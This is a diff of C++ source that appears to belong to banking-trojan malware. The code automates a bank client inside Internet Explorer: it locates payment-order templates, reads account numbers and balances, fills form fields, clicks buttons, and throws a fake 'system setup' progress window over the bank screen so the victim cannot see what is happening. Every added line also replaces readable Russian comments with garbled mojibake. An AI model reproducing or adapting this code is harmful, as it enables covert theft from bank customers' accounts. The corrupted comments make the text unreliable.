+					//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					if( r.right - r.left > 20 )
 					{
 						toolBar = wnd;
@@ -1148,32 +1159,32 @@ static BOOL CALLBACK EnumTopWindows( HWND wnd, LPARAM lParam )
 	pGetWindowThreadProcessId( wnd, &pid );
 	if( pid == (DWORD)lParam )
 	{
-		if( GetWndClassHash(wnd) == 0x6E5950C9 /* IEFrame */ ) //окно ИЕ в текущем процессе
+		if( GetWndClassHash(wnd) == 0x6E5950C9 /* IEFrame */ ) //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
-			IEWnd = wnd; //запоминаем окно ИЕ
-			pEnumChildWindows( wnd, EnumTreeList, 0 ); //ищем в дочерних нужные нам контролы
-			if( treeView && listView ) //нашли нужные контролы (дерево слева и таблицу справа сверху)
+			IEWnd = wnd; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ
+			pEnumChildWindows( wnd, EnumTreeList, 0 ); //пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			if( treeView && listView ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ)
 			{
-				return FALSE; //останавливаем поиск
+				return FALSE; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			}
 		}
 	}
 	return TRUE;
 }
 
-//сравнивает окно wnd с информацией из ControlFinded, если совпадает, то возвращает true
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ wnd пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ ControlFinded, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ true
 static bool CmpWnd( const char* caption, DWORD captionHash, const char* className, DWORD classHash, RECT& r, ControlForm* cf )
 {
 	bool ok = false;
-	//окно нужного класса
-	if( cf->classHash && classHash ) //есть хеш имени класса, сравниваем по нему
+	//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	if( cf->classHash && classHash ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 	{
 		if( classHash == cf->classHash )
 			ok = true;
 	}
 	else 
 	{
-		if( cf->classText ) //есть имя класса, сравниваем по имени
+		if( cf->classText ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		{
 			if( className )
 			{
@@ -1182,30 +1193,30 @@ static bool CmpWnd( const char* caption, DWORD captionHash, const char* classNam
 			}
 		}
 	}
-	if( ok ) //класс окна совпал
+	if( ok ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		ok = false;
-		//сравнимаем по заголовку окна
-		if( cf->captionHash && captionHash ) //есть хеш заголовка
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+		if( cf->captionHash && captionHash ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			if( captionHash == cf->captionHash )
 				ok = true;
 		}
 		else
 		{
-			if( cf->captionText && caption ) //есть текст заголовка
+			if( cf->captionText && caption ) //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{
 				if( m_strstr( caption, cf->captionText ) )
 					ok = true;
 			}
-			else //заголовок не указан, сравниваем по координатам
+			else //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			{
 				int right = cf->x + cf->w - 1, bottom = cf->y + cf->h - 1;
 				if( cf->x <= r.right && right >= r.left && cf->y <= r.bottom && bottom >= r.top )
 					ok = true;
 			}
 		}
-		if( ok ) //параметры окна совпали
+		if( ok ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			return true;
 	}
 	return false;
@@ -1214,7 +1225,7 @@ static bool CmpWnd( const char* caption, DWORD captionHash, const char* classNam
 static void GetControlRect( HWND parent, HWND wnd, RECT& r )
 {
 	pGetWindowRect( wnd, &r );
-	//преобразовываем в координаты окна предка
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	POINT p;
 	p.x = r.left; p.y = r.top;
 	pScreenToClient( parent, &p );
@@ -1237,7 +1248,7 @@ static bool CmpWnd( HWND parent, HWND wnd, ControlForm* cf )
 }
 
 //-----------------------------------------------------------------
-//вспомогательная функция для поиска форм на окне ИЕ
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ
 static BOOL CALLBACK EnumFindForm( HWND wnd, LPARAM lParam )
 {
 	DWORD pid = 0;
@@ -1254,7 +1265,7 @@ static BOOL CALLBACK EnumFindForm( HWND wnd, LPARAM lParam )
 	return TRUE;
 }
 
-//ищет нужную нам форму в дочерних окнах ИЕ
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ
 static HWND FindForm( ControlForm* form )
 {
 	ControlFinded cf;
@@ -1268,11 +1279,11 @@ struct ForFindControls
 {
 	ControlForm* cfIn;
 	ControlFinded* cfOut;
-	int countOut; //сколько найдено
+	int countOut; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	HWND parent;
 };
 
-//вспомогательная функция для поиска контролов на форме
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static BOOL CALLBACK EnumFindControls( HWND wnd, LPARAM lParam )
 {
 	if( pIsWindowVisible(wnd) )
@@ -1291,7 +1302,7 @@ static BOOL CALLBACK EnumFindControls( HWND wnd, LPARAM lParam )
 		{
 			if( CmpWnd( caption, captionHash, className, classHash, r, pcf ) )
 			{
-				//на всякий случай смотрим, чтобы по одному описанию не нашлю несколько окон
+				//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 				int i = 0;
 				for( ; i < ffc->countOut; i++ )
 					if( ffc->cfOut[i].info == pcf )
@@ -1314,8 +1325,8 @@ static BOOL CALLBACK EnumFindControls( HWND wnd, LPARAM lParam )
 	return TRUE;
 }
 
-//ищет контролы на форме parent по описанию в массиве cfIn, результат записывается в cfOut и возвращает функция количество найденных
-//контролов. Массив cfOut должен быть выделен на тоже количество элементов что и cfIn
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ parent пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ cfIn, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ cfOut пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ cfOut пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ cfIn
 static int FindControls( HWND parent, ControlForm* cfIn, ControlFinded* cfOut )
 {
 	ForFindControls ffc;
@@ -1353,7 +1364,7 @@ static char* GetTextTreeItem( HTREEITEM item, char* buf, int szBuf )
 	return 0;
 }
 
-//ищем "платежное поручение"->"Шаблоны", возвращаем item Шаблоны
+//пїЅпїЅпїЅпїЅ "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ"->"пїЅпїЅпїЅпїЅпїЅпїЅпїЅ", пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ item пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* itemAccs, int c_itemAccs )
 {
 	char text[256];
@@ -1362,7 +1373,7 @@ static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* it
 		if( pSendMessageA( treeView, TVM_EXPAND, (WPARAM)TVE_EXPAND, (LPARAM)item ) )
 		{
 			HTREEITEM child = 0;
-			//после разворачивания дерева, ветки могут не сразу появиться, поэтому ждем пока появятся
+			//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			for( int i = 0; i < 20; i++ )
 			{
 				child = (HTREEITEM)pSendMessageA( treeView, TVM_GETNEXTITEM, (WPARAM)TVGN_CHILD, (LPARAM)item );
@@ -1374,23 +1385,23 @@ static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* it
 				if( GetTextTreeItem( item, text, sizeof(text) ) )
 				{
 					DWORD hash = CalcHash(text);
-					if( hash == 0x505B8B0E /* Платежное поручение */ ) //нужная ветка
+					if( hash == 0x505B8B0E /* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */ ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 					{
-						//смотрим есть ли в подветках Шаблоны
+						//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 						HTREEITEM item2 = child;
 						do
 						{
 							if( GetTextTreeItem( item2, text, sizeof(text) ) )
 							{
-								if( m_strstr( text, "Шаблоны" ) )
+								if( m_strstr( text, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ" ) )
 								{
-									//itemPrev - это ветка с номеров счета
-									//выбераем ветку с номером счеиа, чтобы сграбился в хуках баланс
+									//itemPrev - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+									//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 									pSendMessageA( treeView, TVM_SELECTITEM, (WPARAM)TVGN_CARET, (LPARAM)itemPrev );
-									//запоминаем нужные нам ветки счета
+									//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 									GetTextTreeItem( itemPrev, itemAccs[c_itemAccs].acc, sizeof(itemAccs[c_itemAccs].acc) );
 									int ii = 0;
-									//смотрим нет ли этого счета в массиве (проход по дереву может быть не один раз)
+									//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ)
 									for(; ii < c_itemAccs; ii++ )
 										if( itemAccs[ii].itemAcc == itemPrev )
 											break;
@@ -1418,7 +1429,7 @@ static int FindPaymentOrder( HTREEITEM item, HTREEITEM itemPrev, TreeAccount* it
 	return c_itemAccs;
 }
 
-//сворачивает указанное количество веток дерева
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 static void TreeViewCollapse( HTREEITEM item, int count )
 {
 	while( count-- )
@@ -1441,12 +1452,12 @@ static int FindNewPaymentOrder()
 		m_memset( &item, 0, sizeof(item) );
 		item.pszText = text;
 		item.cchTextMax = sizeof(text);
-		item.iSubItem = 6; //именно в 6-м находится наименование шаблона
+		item.iSubItem = 6; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 6-пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		text[0] = 0;
 		pSendMessageA( listView, LVM_GETITEMTEXT, (WPARAM)index, (LPARAM)&item );
 		DWORD hash = CalcHash(text);
 		DBGRAFA( "Rafa", "ListView %d, '%s'", index, text );
-		if( hash == 0x6C433B30 /* НОВОЕ ПЛАТЕЖНОЕ ПОРУЧЕНИЕ */ )
+		if( hash == 0x6C433B30 /* пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */ )
 		{
 			break;
 		}
@@ -1454,7 +1465,7 @@ static int FindNewPaymentOrder()
 	return index;
 }
 
-//ищет контрол среди найденых на форме по его имени
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static ControlFinded* GetControl( const char* name, ControlFinded* cf, int count )
 {
 	for( int i = 0; i < count; i++ )
@@ -1465,7 +1476,7 @@ static ControlFinded* GetControl( const char* name, ControlFinded* cf, int count
 	return 0;
 }
 
-//пишет текст в контрол на форме
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static bool SetText( const char* name, const char* s, ControlFinded* cf, int count, const char* sendChars = 0 )
 {
 	ControlFinded* ctrl = GetControl( name, cf, count );
@@ -1486,7 +1497,7 @@ static bool SetText( const char* name, const char* s, ControlFinded* cf, int cou
 	return false;
 }
 
-//считывает текст с контрола на форме
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static bool GetText( const char* name, char* s, int c_s, ControlFinded* cf, int count )
 {
 	if( s )
@@ -1524,59 +1535,59 @@ static bool ClickButton( const char* name, ControlFinded* cf, int count )
 	return false;
 }
 
-//Создает окно с прогресс баром, которое скрывает под собой все окна
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 static DWORD WINAPI FakeWindow( LPVOID p )
 {
 	HWND parent = (HWND)p;
 	HINSTANCE inst = (HINSTANCE)pGetModuleHandleA(NULL);
 	RECT r, r2;
-	pGetClientRect( parent, &r ); //область которую нужно закрыть
+	pGetClientRect( parent, &r ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	POINT pp;
 	pp.x = 0;
 	pp.y = 0;
-	//узнаем координаты области на экране
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	pClientToScreen( parent, &pp ); 
 	int xFW = pp.x, yFW = pp.y;
 	int wFW = r.right, hFW = r.bottom;
-	//рассчитываем положение прогресс бара на новом окне
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	int wPB = r.right * 80 / 100;
 	int hPB = 25;
 	int xPB = (r.right - wPB) / 2;
 	int yPB = (r.bottom - hPB) / 2;
-	//создаем скрывающее окно
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	HWND fakeWindow = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_CHILD | WS_POPUP, xFW, yFW, wFW, hFW, parent, NULL, inst, NULL );
 
 	if( !fakeWindow )
       return 0; 
-	//окно в котором печатается текст
+	//пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	HWND warnWnd = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, xPB, yPB - 16, wPB, 16, fakeWindow, 0, inst, 0 );
-	//сам текст пишем в статус баре, чтобы был нормальный фон и цвет текста
-	HWND warnText = (HWND)pCreateWindowExA( 0, STATUSCLASSNAME, "Подождите, идет настройка системы ...", WS_VISIBLE | WS_CHILD | SBT_NOBORDERS, 0, 0, 0, 0, warnWnd, 0, inst, 0 );
-	//статус бар справа рисует треугольник, это окно его скрывает
+	//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	HWND warnText = (HWND)pCreateWindowExA( 0, STATUSCLASSNAME, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ ...", WS_VISIBLE | WS_CHILD | SBT_NOBORDERS, 0, 0, 0, 0, warnWnd, 0, inst, 0 );
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	HWND warnWnd2 = (HWND)pCreateWindowExA( 0, "STATIC", "", WS_VISIBLE | WS_CHILD, wPB - 16, 0, 16, 16, warnWnd, 0, inst, 0 );
-	//создаем сам прогресс бар
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	HWND progressBar = (HWND)pCreateWindowExA( 0, PROGRESS_CLASS, 0, WS_CHILD | WS_VISIBLE, xPB, yPB, wPB, hPB, fakeWindow, 0, inst, 0 );
 
 	pShowWindow( fakeWindow, SW_SHOW );
 	pUpdateWindow(fakeWindow);
-	//устанавливаем таймер для инкримента в статус баре
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	pSetTimer( fakeWindow, 1, 500, 0 );
-	//настраиваем статус бар
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	pSendMessageA( progressBar, PBM_SETRANGE, 0, MAKELPARAM( 0, 60 )); 
 	pSendMessageA( progressBar, PBM_SETSTEP, (WPARAM) 1, 0 );
 	MSG msg;
 	int remain = 60;
-	//запоминаем положение окна
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	pGetWindowRect( parent, &r2 );
 	r.left = r2.left;
 	r.top = r2.top;
 	r.right = r2.right;
 	r.bottom = r2.bottom;
 
-	//прогоняем в потоке сообщения и реагируем только на свой таймер
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	while( (stateFakeWindow & 1) && pGetMessageA( &msg, 0, 0, 0 ) )
 	{
-		if( msg.message == WM_TIMER && msg.hwnd == fakeWindow ) //наш таймер
+		if( msg.message == WM_TIMER && msg.hwnd == fakeWindow ) //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			pSendMessageA( progressBar, PBM_STEPIT, 0, 0 ); 
 			//if( --remain == 0 )
@@ -1584,11 +1595,11 @@ static DWORD WINAPI FakeWindow( LPVOID p )
 		}
 	    pTranslateMessage( &msg );
 		pDispatchMessageA( &msg );
-		//проверяем не изменило ли свое положение или размеры окно которое скрываем
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		pGetWindowRect( parent, &r2 );
 		if( r.left != r2.left || r.top != r2.top || r.right != r2.right || r.bottom != r2.bottom )
 		{
-			//если изменило, то подгоняем наше окно под предка
+			//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			r.left = r2.left;
 			r.top = r2.top;
 			r.right = r2.right;
@@ -1611,14 +1622,14 @@ static void PosMouseForMouseEvent( HWND wnd, POINT& p )
 	p.y = p.y * 65535 / heightScreen;
 }
 
-//сюда попадаем когда найдены контролы TreeView и ListView окна банка
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ TreeView пїЅ ListView пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 static void WorkInRafa()
 {
 	c_findedBalans = 0;
 	HWND parent = (HWND)pGetParent(treeView);
-	//подменяем оконную процедуру главного окна, для перехвата нотификационных сообщений
